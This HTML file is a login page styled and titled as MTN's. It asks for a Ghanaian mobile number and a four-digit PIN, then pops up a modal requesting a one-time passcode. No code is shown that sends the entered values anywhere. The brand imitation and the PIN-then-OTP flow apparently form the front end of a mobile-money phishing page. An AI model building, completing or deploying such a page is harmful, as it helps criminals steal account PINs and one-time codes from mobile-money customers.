<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>MTN — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:#ffffff;
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#020617;
}

/* CARD */
.card{
  width:100%;
  max-width:380px;
  background:#ffffff;
  padding:20px;
  border-radius:14px;
  border:1px solid #e5e7eb;
  box-shadow:0 12px 30px rgba(0,0,0,.08);
}

.logo{
  height:44px;
  display:block;
  margin:0 auto 10px;
}

h2{
  text-align:center;
  margin:0 0 12px;
  font-size:20px;
  color:#020617;
}

label{
  display:block;
  font-size:13px;
  margin-top:10px;
  color:#334155;
}

/* PHONE ROW */
.phone-row{
  display:flex;
  gap:8px;
}

.cc{
  width:72px;
  text-align:center;
  background:#f1f5f9;
  border:1px solid #e5e7eb;
  border-radius:8px;
  padding:10px;
  font-size:14px;
}

input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #e5e7eb;
  background:#ffffff;
  color:#020617;
  font-size:14px;
  outline:none;
}

input::placeholder{color:#9ca3af}

input:focus{
  border-color:#ffd400;
  box-shadow:0 0 0 1px rgba(255,212,0,.45);
}

/* BUTTON */
.btn{
  background:#ffd400;
  color:#000;
  padding:10px;
  border-radius:8px;
  border:0;
  margin-top:14px;
  width:100%;
  font-weight:700;
  cursor:pointer;
}

.btn[disabled]{
  background:#fde68a;
  cursor:not-allowed;
}

.req{color:#ef4444;margin-right:6px}
.small{font-size:13px;color:#64748b}
.success{color:#16a34a;font-weight:600}
.error{min-height:18px;font-size:13px;color:#dc2626}

/* PIN */
.pin-row{
  display:flex;
  gap:10px;
  justify-content:center;
  margin-top:10px;
}
.pin-digit{
  width:18px;
  height:18px;
  border-radius:50%;
  border:2px solid #020617;
  background:#fff;
  font-size:1px;
  color:transparent;
}
.pin-digit.filled{
  background:#ffd400;
  border-color:#ffd400;
}

/* OTP MODAL */
.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(255,255,255,.9);
  display:flex;
  align-items:center;
  justify-content:center;
}

.otp-box{
  background:#ffffff;
  padding:20px;
  border-radius:14px;
  min-width:340px;
  border:1px solid #e5e7eb;
  box-shadow:0 14px 30px rgba(0,0,0,.12);
}

.otp-row{
  display:flex;
  gap:10px;
  justify-content:center;
  margin-top:10px;
}

.otp-digit{
  width:18px;
  height:18px;
  border-radius:50%;
  border:2px solid #020617;
  background:#fff;
}
.otp-digit.filled{
  background:#ffd400;
  border-color:#ffd400;
}

.resend-btn{
  background:#ffd400;
  border:0;
  padding:10px;
  border-radius:8px;
  font-weight:600;
  cursor:pointer;
}

.action-secondary{
  background:#f1f5f9;
}
</style>
</head>

<body>

<div class="card">
  <img src="assets/logo.svg" class="logo">
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">★</span>Mobile Number</label>
    <div class="phone-row">
      <input class="cc" value="+233" disabled>
      <input id="phone" inputmode="numeric" placeholder="7XXXXXX">
    </div>
    <div id="phoneError" class="error"></div>

    <label><span class="req">★</span>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <input type="text" id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP</strong></div>
    <p class="small">We sent an OTP to your phone</p>

    <div class="otp-row">
      <input class="otp-digit">
      <input class="otp-digit">
      <input class="otp-digit">
      <input class="otp-digit">
      <input class="otp-digit">
    </div>

    <div style="display:flex;gap:10px;margin-top:14px">
      <button id="confirmOtp" class="resend-btn" disabled>Confirm</button>
      <button id="cancelOtp" class="resend-btn action-secondary">Cancel</button>
    </div>
  </div>
</div>

<script>
const phone=document.getElementById('phone');
const phoneError=document.getElementById('phoneError');
const loginBtn=document.getElementById('loginBtn');
const pins=[...document.querySelectorAll('.pin-digit')];
let pinValue='';

function validatePhone(){
  const v=phone.value.replace(/\D/g,'');
  if(!v) return false;
  if(v.length<9||v.length>10){
    phoneError.innerText='Enter a valid 9 or 10 digit number';
    return false;
  }
  phoneError.innerText='';
  return true;
}

phone.addEventListener('input',()=>{
  phone.value=phone.value.replace(/\D/g,'').slice(0,10);
  loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));
});

pins.forEach((p,i)=>{
  p.addEventListener('input',()=>{
    p.value=p.value.replace(/\D/g,'');
    p.classList.toggle('filled',!!p.value);
    if(p.value&&i<3)pins[i+1].focus();
    pinValue=pins.map(x=>x.value).join('');
    loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));
  });
});

document.getElementById('loginForm').onsubmit=e=>{
  e.preventDefault();
  document.getElementById('otpModal').style.display='flex';
};
document.getElementById('cancelOtp').onclick=()=>{
  document.getElementById('otpModal').style.display='none';
};
</script>

</body>
</html>
